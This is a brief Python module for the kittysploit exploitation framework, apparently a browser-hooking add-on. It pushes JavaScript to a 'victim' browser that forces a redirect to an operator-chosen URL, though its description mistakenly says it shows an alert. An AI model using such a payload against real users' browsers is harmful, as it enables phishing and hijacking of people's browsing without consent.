from kittysploit import *

class Module(BrowserAuxiliary):

	__info__ = {
		"name": "redirect",
		"description": "Execute alert on browser victim",
		"browser": Browser.ALL,
		"platform": Platform.ALL
	}	
	
	website = OptString("https://kittysploit.com", "Redirection destination", "yes")

	def run(self):
		self.send_js(f"window.location.replace('{self.website}');")
